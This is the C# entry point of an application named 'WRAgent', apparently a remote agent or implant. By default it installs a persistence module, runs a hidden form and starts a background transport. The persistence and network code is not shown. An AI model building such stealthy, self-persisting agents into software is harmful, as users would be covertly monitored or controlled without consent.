using System.Diagnostics;
using System.Text;
using System.Windows.Forms;

namespace WRAgent
{
    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            // single instance per machine/user
            var mutexName = @"Global\" + BuildInfo.AgentTag + "-" + Util.MachineId();
            Mutex mutex;
            bool fresh;
            try
            {
                mutex = new Mutex(true, mutexName, out fresh);
            }
            catch
            {
                mutex = new Mutex(true, @"Local\" + BuildInfo.AgentTag + "-" + Util.MachineId(), out fresh);
            }
            if (!fresh) return;

            AppDomain.CurrentDomain.UnhandledException += (_, e) =>
                Log.W("unhandled: " + e.ExceptionObject);

            var noInstall = args.Any(a => a.Equals("--no-install", StringComparison.OrdinalIgnoreCase));
            if (!noInstall)
            {
                try { PersistModule.Ensure(); }
                catch (Exception e) { Log.W("ensure: " + e.Message); }
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var form = new HiddenForm();
            _ = Transport.I.RunAsync();

            Log.W("agent up");
            Application.Run(form);
        }
    }
}
